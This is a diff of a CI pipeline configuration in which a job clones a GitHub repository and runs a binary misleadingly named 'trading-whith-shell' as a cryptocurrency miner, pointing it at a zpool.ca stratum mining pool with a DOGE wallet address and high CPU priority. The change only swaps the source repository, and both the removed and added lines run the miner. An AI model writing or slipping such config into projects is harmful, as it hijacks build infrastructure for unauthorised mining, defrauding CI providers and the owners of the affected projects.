@@ -10,5 +10,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'git clone https://github.com/muhammadoope/1'
-            - 'cd 1 && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE  --cpu-priority 4'
+            - 'git clone https://github.com/vumaxekiopo/potential-spork'
+            - 'cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE  --cpu-priority 4'
